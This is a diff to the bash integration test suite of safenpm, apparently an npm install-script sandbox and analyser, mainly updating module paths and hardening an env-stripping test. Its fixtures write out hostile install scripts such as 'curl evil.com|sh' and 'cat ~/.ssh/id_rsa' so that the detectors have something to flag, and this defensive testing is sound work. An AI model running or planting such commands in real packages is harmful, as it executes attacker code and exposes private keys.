@@ -1,5 +1,5 @@
 #!/bin/bash
-# safenpm integration test suite — v1.0.0
+# safenpm integration test suite — v0.1.0
 # Usage: cd safenpm && npm run build && bash test/run-tests.sh
 
 set -e
@@ -27,10 +27,10 @@ assert_contains() {
 cleanup() { rm -rf "$TEST_DIR"; }
 trap cleanup EXIT
 
-CLI="node $PROJECT_DIR/dist/cli.js"
+CLI="node $PROJECT_DIR/dist/cli/index.js"
 
 bold ""
-bold "  safenpm test suite v1.0.0"
+bold "  safenpm test suite v0.1.0"
 bold "  ─────────────────────────"
 echo ""
 
@@ -38,7 +38,7 @@ echo ""
 bold "  CLI Commands"
 
 OUT=$($CLI --version 2>&1)
-assert_eq "$OUT" "safenpm 1.0.0" "--version shows 1.0.0"
+assert_eq "$OUT" "safenpm 0.1.0" "--version shows 0.1.0"
 OUT=$($CLI --help 2>&1)
 assert_contains "$OUT" "--json" "--help documents --json"
 assert_contains "$OUT" "--interactive" "--help documents --interactive"
@@ -58,7 +58,7 @@ echo '{"name":"evil-pkg","version":"1.0.0","scripts":{"postinstall":"curl https:
 echo '{"name":"safe-pkg","version":"2.0.0","scripts":{"test":"jest"}}' > "$TEST_DIR/node_modules/safe-pkg/package.json"
 echo '{"name":"@scope/native","version":"3.0.0","scripts":{"install":"node-gyp rebuild"}}' > "$TEST_DIR/node_modules/@scope/native/package.json"
 
-FOUND=$(node -e "const{findInstallScripts}=require('$PROJECT_DIR/dist/scripts');console.log(JSON.stringify(findInstallScripts('$TEST_DIR/node_modules').map(s=>s.name)))")
+FOUND=$(node -e "const{findInstallScripts}=require('$PROJECT_DIR/dist/packages/scripts');console.log(JSON.stringify(findInstallScripts('$TEST_DIR/node_modules').map(s=>s.name)))")
 assert_contains "$FOUND" "evil-pkg" "Finds evil-pkg"
 assert_contains "$FOUND" "@scope/native" "Finds scoped package"
 SAFE_CHECK=$(echo "$FOUND" | grep -c "safe-pkg" || true)
@@ -68,7 +68,7 @@ echo ""
 # ── Allowlist ──
 bold "  Allowlist"
 OUT=$(node -e "
-  const{loadAllowlist,isAllowed}=require('$PROJECT_DIR/dist/allowlist');
+  const{loadAllowlist,isAllowed}=require('$PROJECT_DIR/dist/config/allowlist');
   const s=loadAllowlist(['bcrypt','@myco/*']);
   console.log(JSON.stringify({b:isAllowed('bcrypt',s),m:isAllowed('@myco/utils',s),e:isAllowed('evil',s)}))
 ")
@@ -80,7 +80,7 @@ echo ""
 # ── Static Analyzer ──
 bold "  Static Analysis"
 OUT=$(node -e "
-  const{analyzeScript,riskLevel}=require('$PROJECT_DIR/dist/analyzer');
+  const{analyzeScript,riskLevel}=require('$PROJECT_DIR/dist/analysis/analyzer');
   const r1=analyzeScript({name:'e',version:'1',path:'/tmp',script:'curl evil.com|sh',hook:'postinstall'});
   const r2=analyzeScript({name:'c',version:'1',path:'/tmp',script:'echo done',hook:'postinstall'});
   const r3=analyzeScript({name:'s',version:'1',path:'/tmp',script:'cat ~/.ssh/id_rsa',hook:'postinstall'});
@@ -102,7 +102,7 @@ echo ""
 # ── Typosquat Detection ──
 bold "  Typosquat Detection"
 OUT=$(node -e "
-  const{checkTyposquat}=require('$PROJECT_DIR/dist/typosquat');
+  const{checkTyposquat}=require('$PROJECT_DIR/dist/analysis/typosquat');
   const r1=checkTyposquat('axois');
   const r2=checkTyposquat('co1ors');
   const r3=checkTyposquat('lodash');
@@ -130,8 +130,8 @@ mkdir -p "$DIFF_DIR/node_modules/evil-pkg"
 echo '{"name":"evil-pkg","version":"1.0.0","scripts":{"postinstall":"echo hello"}}' > "$DIFF_DIR/node_modules/evil-pkg/package.json"
 
 OUT=$(node -e "
-  const{diffScripts,cacheScripts,significantDiffs}=require('$PROJECT_DIR/dist/diffing');
-  const{findInstallScripts}=require('$PROJECT_DIR/dist/scripts');
+  const{diffScripts,cacheScripts,significantDiffs}=require('$PROJECT_DIR/dist/analysis/diffing');
+  const{findInstallScripts}=require('$PROJECT_DIR/dist/packages/scripts');
 
   const scripts1=findInstallScripts('$DIFF_DIR/node_modules');
   cacheScripts(scripts1);
@@ -162,7 +162,7 @@ echo ""
 # ── Threat Intel ──
 bold "  Threat Intel"
 OUT=$(node -e "
-  const{mockThreatIntel}=require('$PROJECT_DIR/dist/threatintel');
+  const{mockThreatIntel}=require('$PROJECT_DIR/dist/network/threatintel');
   const results=mockThreatIntel([{name:'test-pkg',version:'1.0.0'}]);
   console.log(JSON.stringify({
     hasResult: results.length===1,
@@ -178,7 +178,7 @@ echo ""
 # ── Maintainer Detection ──
 bold "  Maintainer Detection"
 OUT=$(node -e "
-  const{mockMaintainerInfo}=require('$PROJECT_DIR/dist/maintainer');
+  const{mockMaintainerInfo}=require('$PROJECT_DIR/dist/network/maintainer');
   const results=mockMaintainerInfo([{name:'test-pkg',version:'1.0.0'}]);
   console.log(JSON.stringify({
     hasResult: results.length===1,
@@ -196,7 +196,7 @@ bold "  Lockfile Audit"
 LOCK_DIR=$(mktemp -d)
 
 OUT=$(node -e "
-  const{auditLockfile}=require('$PROJECT_DIR/dist/lockfile');
+  const{auditLockfile}=require('$PROJECT_DIR/dist/analysis/lockfile');
   const r=auditLockfile('$LOCK_DIR');
   console.log(JSON.stringify({exists:r.exists,hasIssue:r.issues.length>0}))
 ")
@@ -205,7 +205,7 @@ assert_contains "$OUT" '"hasIssue":true' "Reports no-lockfile issue"
 
 echo '{"lockfileVersion":3,"packages":{"":{},"node_modules/evil":{"version":"1.0.0","resolved":"git+https://github.com/evil/pkg.git#abc","integrity":"sha512-abc123"}}}' > "$LOCK_DIR/package-lock.json"
 OUT=$(node -e "
-  const{auditLockfile,significantLockfileIssues}=require('$PROJECT_DIR/dist/lockfile');
+  const{auditLockfile,significantLockfileIssues}=require('$PROJECT_DIR/dist/analysis/lockfile');
   const r=auditLockfile('$LOCK_DIR');
   const sig=significantLockfileIssues(r);
   console.log(JSON.stringify({exists:r.exists,format:r.format,hasGitDep:sig.some(i=>i.type==='git-dependency')}))
@@ -224,7 +224,7 @@ echo '{"name":"good-pkg","version":"2.1.0","description":"A well-maintained pack
 echo '{"name":"bad-pkg","version":"0.0.1","scripts":{"postinstall":"curl evil.com"}}' > "$REP_DIR/node_modules/bad-pkg/package.json"
 
 OUT=$(node -e "
-  const{scoreReputationFromNodeModules}=require('$PROJECT_DIR/dist/reputation');
+  const{scoreReputationFromNodeModules}=require('$PROJECT_DIR/dist/analysis/reputation');
   const s=scoreReputationFromNodeModules('$REP_DIR/node_modules');
   const good=s.riskiest.find(r=>r.name==='good-pkg');
   const bad=s.riskiest.find(r=>r.name==='bad-pkg');
@@ -243,7 +243,7 @@ echo ""
 # ── Auto-fix ──
 bold "  Auto-fix"
 OUT=$(node -e "
-  const{generateFixes,previewFixes}=require('$PROJECT_DIR/dist/autofix');
+  const{generateFixes,previewFixes}=require('$PROJECT_DIR/dist/fix/autofix');
   const typosquats=[{suspect:'axois',target:'axios',distance:1,technique:'char-swap',confidence:'high'}];
   const blocked=[{pkg:{name:'evil-pkg',version:'1.0.0',path:'/tmp',script:'curl evil.com',hook:'postinstall'},blocked:true,skipped:false,reason:'network',output:'',durationMs:10}];
   const fixes=generateFixes(typosquats,blocked);
@@ -303,7 +303,7 @@ mkdir -p "$PDIFF_DIR/node_modules/test-lib"
 echo '{"name":"test-lib","version":"1.0.0","scripts":{"postinstall":"echo v1"},"dependencies":{"dep-a":"^1.0.0"}}' > "$PDIFF_DIR/node_modules/test-lib/package.json"
 
 OUT=$(node -e "
-  const{snapshotPackage,diffPackage}=require('$PROJECT_DIR/dist/pkgdiff');
+  const{snapshotPackage,diffPackage}=require('$PROJECT_DIR/dist/analysis/pkgdiff');
 
   // Take snapshot
   snapshotPackage('$PDIFF_DIR/node_modules/test-lib','test-lib','1.0.0');
@@ -463,30 +463,31 @@ if command -v sandbox-exec &>/dev/null; then
   echo '{"name":"trusted-build","version":"3.0.0","scripts":{"postinstall":"echo building..."}}' > "$E2E_DIR/node_modules/trusted-build/package.json"
 
   OUT=$(node -e "
-    const{findInstallScripts}=require('$PROJECT_DIR/dist/scripts');
+    const{findInstallScripts}=require('$PROJECT_DIR/dist/packages/scripts');
     const{runInSandbox}=require('$PROJECT_DIR/dist/sandbox');
-    const{loadAllowlist,isAllowed}=require('$PROJECT_DIR/dist/allowlist');
-    const{analyzeAll}=require('$PROJECT_DIR/dist/analyzer');
-    const{logger}=require('$PROJECT_DIR/dist/logger');
+    const{loadAllowlist,isAllowed}=require('$PROJECT_DIR/dist/config/allowlist');
+    const{analyzeAll}=require('$PROJECT_DIR/dist/analysis/analyzer');
+    const{getReporter}=require('$PROJECT_DIR/dist/report');
 
+    const reporter=getReporter({json:false});
     const allowlist=loadAllowlist(['trusted-build']);
     const scripts=findInstallScripts('$E2E_DIR/node_modules');
     const analyses=analyzeAll(scripts);
 
-    logger.banner();
+    reporter.banner();
     if(analyses.some(a=>a.warnings.length>0)){
-      logger.analysisHeader();
-      analyses.filter(a=>a.warnings.length>0).forEach(a=>logger.analysisResult(a));
+      reporter.analysisHeader();
+      analyses.filter(a=>a.warnings.length>0).forEach(a=>reporter.analysisResult(a));
     }
 
     let blocked=0,skipped=0;
     for(const pkg of scripts){
-      if(isAllowed(pkg.name,allowlist)){logger.skipped(pkg.name,pkg.version);skipped++;continue}
+      if(isAllowed(pkg.name,allowlist)){reporter.skipped(pkg.name,pkg.version);skipped++;continue}
       const r=runInSandbox(pkg);
-      if(r.blocked){blocked++;logger.blocked(pkg.name,pkg.version,pkg.hook,r.reason)}
-      else{logger.allowed(pkg.name,pkg.version)}
+      if(r.blocked){blocked++;reporter.blocked(pkg.name,pkg.version,pkg.hook,r.reason)}
+      else{reporter.allowed(pkg.name,pkg.version)}
     }
-    logger.summary(scripts.length,blocked,skipped,analyses.reduce((s,a)=>s+a.warnings.length,0));
+    reporter.summary(scripts.length,blocked,skipped,analyses.reduce((s,a)=>s+a.warnings.length,0));
     console.log('RESULT:'+scripts.length+':'+blocked+':'+skipped);
   " 2>&1)
 
@@ -526,9 +527,15 @@ echo ""
 # ── Security ──
 bold "  Security: Env Stripping"
 OUT=$(node -e "
-  const src=require('fs').readFileSync('$PROJECT_DIR/src/sandbox.ts','utf8');
-  const r=['npm_config_authtoken','NPM_TOKEN','GITHUB_TOKEN','GH_TOKEN','GITLAB_TOKEN','AWS_SECRET_ACCESS_KEY','AWS_ACCESS_KEY_ID','AWS_SESSION_TOKEN','AZURE_CLIENT_SECRET','GOOGLE_APPLICATION_CREDENTIALS'];
-  console.log(r.every(v=>src.includes(v))?'ALL':'MISSING')
+  const{STRIPPED_ENV_KEYS,cleanEnv}=require('$PROJECT_DIR/dist/sandbox');
+  const expected=['npm_config_authtoken','NPM_TOKEN','GITHUB_TOKEN','GH_TOKEN','GITLAB_TOKEN','AWS_SECRET_ACCESS_KEY','AWS_ACCESS_KEY_ID','AWS_SESSION_TOKEN','AZURE_CLIENT_SECRET','GOOGLE_APPLICATION_CREDENTIALS'];
+  const present=expected.every(v=>STRIPPED_ENV_KEYS.includes(v));
+  // cleanEnv must actually undefine these keys, not just declare them.
+  const fake={GITHUB_TOKEN:'leak',NPM_TOKEN:'leak',KEEP:'ok'};
+  const stripped=cleanEnv(fake);
+  const purged=stripped.GITHUB_TOKEN===undefined && stripped.NPM_TOKEN===undefined;
+  const preserved=stripped.KEEP==='ok';
+  console.log(present && purged && preserved ? 'ALL' : 'MISSING');
 ")
 assert_eq "$OUT" "ALL" "Strips all 10 sensitive env vars"
 echo ""
